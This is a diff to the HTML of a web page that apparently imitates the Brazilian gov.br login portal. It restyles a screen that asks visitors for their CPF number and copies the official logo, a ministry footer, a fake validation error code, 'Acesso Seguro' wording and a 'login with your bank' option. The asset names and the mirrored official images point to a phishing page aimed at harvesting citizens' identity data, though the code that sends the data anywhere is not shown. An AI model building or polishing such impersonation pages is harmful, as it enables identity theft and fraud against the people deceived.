@@ -10,38 +10,11 @@
   <link rel="manifest" href="manifest.json">
   <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;600;700;800&family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-    body { font-family: 'Raleway', 'Rawline', sans-serif; background-color: #fff; height: 100dvh; overflow: hidden; }
-    #app { position: fixed; top: 0; left: 0; width: 100%; height: 100%; overflow-y: auto; background: #f6f6f6; }
-
-    /* Estilos Marinha */
-    .capa-area { height: 70%; width: 100%; background-image: url('img_marinha/capa_cnh.png'); background-size: cover; background-position: center top; position: relative; flex-shrink: 0; }
-    .capa-area::after { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 40%; background: linear-gradient(to bottom, rgba(0, 0, 0, 0.5), transparent); }
-    .conteudo-branco { flex: 1; background-color: white; border-top-left-radius: 25px; border-top-right-radius: 25px; margin-top: -25px; position: relative; z-index: 10; padding: 15px 30px; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 15px; }
-    .logo-container img { max-width: 140px; display: block; margin-bottom: 5px; }
-    .termos-texto { text-align: center; font-size: 12px; color: #333; line-height: 1.3; margin-bottom: 5px; }
-    .termos-texto a { color: #1351b4; text-decoration: underline; font-weight: 600; }
-    .btn-gov { background-color: #1351b4; color: white; width: 100%; padding: 14px 0; border-radius: 50px; border: none; font-size: 14px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 8px rgba(19, 81, 180, 0.25); text-transform: uppercase; }
-
-    .header-marinha { display: flex; justify-content: flex-start; align-items: center; margin-bottom: 24px; padding: 16px 20px; width: 100%; background-color: #fff; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.16); }
-    .logo-gov-login { width: 100px; }
-    .login-card { width: calc(100% - 40px); margin: 0 auto; background-color: #fff; padding: 24px 16px 22px; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.16); box-sizing: border-box; }
-    .title-marinha { font-weight: 600; font-size: 18px; color: #000000; margin-bottom: 20px; width: 100%; text-align: left; }
-    .subtitle-marinha { font-size: 16px; font-weight: 600; margin-bottom: 5px; display: flex; align-items: center; gap: 8px; width: 100%; color: #333; }
-    .subtitle-marinha i { color: #1351b4; }
-    .description-marinha { font-size: 14px; color: #555; margin-bottom: 20px; line-height: 1.4; width: 100%; }
-    .input-group-marinha { margin-bottom: 20px; width: 100%; }
-    .label-marinha { font-weight: 600; font-size: 14px; color: #333; margin-bottom: 5px; display: block; }
-    .input-field-marinha { width: 100%; padding: 12px 15px; font-size: 16px; border: 1px solid #ccc; border-radius: 4px; outline: none; background-color: #fff; color: #333; }
-    .input-field-marinha:focus { border-color: #d84800; box-shadow: 0 0 0 1px #d84800 inset; background-color: #ffee0169; }
-    .alert-error-marinha { background-color: #fbf5d0; border: 1px solid #e5c22d; border-radius: 4px; padding: 12px 15px; margin-bottom: 20px; display: none; align-items: center; font-size: 14px; color: #000; font-weight: 500; width: 100%; }
-    .alert-error-marinha i { font-size: 18px; margin-right: 12px; }
-    .btn-primary-marinha { width: 100%; padding: 12px; background-color: #1351b4; color: white; border: none; border-radius: 25px; font-size: 16px; font-weight: 600; cursor: pointer; }
-    .options-title-marinha { font-size: 14px; font-weight: 600; margin-top: 30px; margin-bottom: 15px; border-top: 1px solid #eee; padding-top: 20px; width: 100%; color: #333; }
-    .option-btn-marinha { display: flex; align-items: center; width: 100%; padding: 12px 15px; background: white; border: 1px solid #ddd; border-radius: 25px; margin-bottom: 10px; color: #1351b4; font-weight: 600; font-size: 14px; cursor: pointer; }
-    .option-btn-marinha i { margin-right: 10px; font-size: 16px; width: 20px; text-align: center; }
-    .selo-marinha { background-color: #008f43; color: white; font-size: 9px; padding: 2px 6px; border-radius: 4px; margin-left: auto; font-weight: 700; }
-    .footer-marinha { margin-top: 30px; text-align: center; font-size: 12px; color: #666; padding-bottom: 20px; }
+    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+    body { font-family: 'Raleway', sans-serif; background: #fff; overflow-x: hidden; }
+    #app { position: fixed; top: 0; left: 0; width: 100%; height: 100%; overflow-y: auto; }
+    .screen { display: none; min-height: 100vh; min-height: 100dvh; flex-direction: column; }
+    .screen.active { display: flex; }
   </style>
 </head>
 <body>
@@ -98,33 +71,52 @@
   }
 
   // ============================================================
-  // TELA 2 - LOGIN CPF (MARINHA)
+  // TELA 2 - LOGIN CPF
   // ============================================================
   function showLoginCPF() {
     show(`
-      <div id="tela-login" style="width:100%; height:100%; background-color:#f6f6f6; display:flex; flex-direction:column; align-items:center; overflow-y:auto;">
-        <div class="header-marinha">
-          <img src="img_marinha/logo.png" class="logo-gov-login" alt="gov.br">
+      <div style="min-height:100vh;min-height:100dvh;display:flex;flex-direction:column;background:#f0f0f0;">
+        <div style="background:#071D41;padding:12px 16px;display:flex;align-items:center;gap:12px;">
+          <button onclick="showSplash()" style="background:none;border:none;cursor:pointer;padding:0;display:flex;">
+            <svg width="30" height="30" viewBox="0 0 30 30" fill="none"><circle cx="15" cy="15" r="13" stroke="white" stroke-width="2" fill="none"/><path d="M17 10L12 15L17 20" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          </button>
+          <span style="color:#fff;font-size:14px;font-weight:700;letter-spacing:0.5px;">ENTRAR COM GOV.BR</span>
         </div>
-        <div class="login-card">
-          <div class="title-marinha">Identifique-se no gov.br</div>
-          <div class="subtitle-marinha"><i class="fas fa-id-card"></i> Número do CPF</div>
-          <div class="description-marinha">Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</div>
-
-          <div class="input-group-marinha">
-            <label class="label-marinha">CPF</label>
-            <input type="tel" id="cpf-input" class="input-field-marinha" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" autocomplete="off" oninput="maskCPF(this)" onkeydown="if(event.key==='Enter')btnContinuar()">
+        <div style="background:#fff;padding:14px 16px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #e0e0e0;">
+          <img src="gov/arquivos/padrao-govbr/img/govbr-logo-large.png" alt="gov.br" style="height:28px;" onerror="this.style.display='none';this.nextElementSibling.style.display='block'">
+          <span style="display:none;font-weight:800;font-size:18px;color:#1351B4;font-style:italic;">gov<span style="color:#FFCD07">.br</span></span>
+          <span style="font-size:11px;color:#888;">Acesso Seguro</span>
+        </div>
+        <div style="flex:1;background:#fff;padding:20px 16px;">
+          <h2 style="font-size:18px;font-weight:700;color:#333;margin-bottom:6px;">Identifique-se no gov.br</h2>
+          <p style="font-size:13px;color:#666;margin-bottom:20px;">Digite seu CPF para acessar sua conta gov.br</p>
+          <label style="font-size:12px;font-weight:600;color:#333;display:block;margin-bottom:6px;">CPF</label>
+          <input id="cpf-input" type="tel" maxlength="14" placeholder="000.000.000-00"
+            style="width:100%;padding:12px 14px;border:1.5px solid #ccc;border-radius:4px;font-size:16px;font-family:'Raleway',sans-serif;outline:none;margin-bottom:8px;"
+            oninput="maskCPF(this)" onkeydown="if(event.key==='Enter')btnContinuar()">
+          <div id="cpf-error" style="display:none;background:#fef2f2;border:1px solid #fecaca;border-radius:4px;padding:10px 12px;color:#dc2626;font-size:13px;font-weight:600;margin-bottom:12px;">
+            ⚠ CPF informado inválido. (ERL0000500)
           </div>
-
-          <div id="cpf-error" class="alert-error-marinha"><i class="fas fa-exclamation-triangle"></i> CPF informado inválido. (ERL0000500)</div>
-          <button class="btn-primary-marinha" id="btn-continuar" onclick="btnContinuar()">Continuar</button>
-
-          <div class="options-title-marinha">Outras opções de identificação:</div>
-          <div class="option-btn-marinha"><i class="fas fa-university"></i> Login com seu banco <span class="selo-marinha">SUA CONTA SERÁ PRATA</span></div>
-          <div class="option-btn-marinha"><i class="fas fa-qrcode"></i> Login com QR code</div>
-          <div class="option-btn-marinha"><i class="fas fa-mobile-alt"></i> Seu aplicativo gov.br</div>
-          <div class="option-btn-marinha"><i class="fas fa-cloud"></i> Seu certificado digital em nuvem</div>
-          <div class="footer-marinha">Ministério da Gestão e da Inovação em Serviços Públicos</div>
+          <button id="btn-continuar" onclick="btnContinuar()" style="width:100%;padding:13px;background:#1351B4;color:#fff;border:none;border-radius:25px;font-size:15px;font-weight:700;cursor:pointer;margin-bottom:20px;">
+            Continuar
+          </button>
+          <div style="text-align:center;margin-bottom:16px;">
+            <span style="font-size:12px;color:#888;font-weight:600;">Outras opções de identificação:</span>
+          </div>
+          <div style="display:flex;flex-direction:column;gap:10px;">
+            <div style="display:flex;align-items:center;gap:12px;padding:14px;border:1px solid #e0e0e0;border-radius:8px;cursor:pointer;">
+              <span style="font-size:20px;">🏦</span>
+              <span style="font-size:13px;font-weight:600;color:#333;">Login com seu banco</span>
+              <span style="margin-left:auto;background:#168821;color:#fff;font-size:10px;font-weight:700;padding:2px 8px;border-radius:4px;">SUA CONTA SERÁ PRATA</span>
+            </div>
+            <div style="display:flex;align-items:center;gap:12px;padding:14px;border:1px solid #e0e0e0;border-radius:8px;cursor:pointer;">
+              <span style="font-size:20px;">📱</span>
+              <span style="font-size:13px;font-weight:600;color:#333;">Seu aplicativo gov.br</span>
+            </div>
+          </div>
+        </div>
+        <div style="background:#f5f5f5;padding:12px;text-align:center;font-size:11px;color:#888;">
+          Ministério da Gestão e da Inovação em Serviços Públicos
         </div>
       </div>
     `);
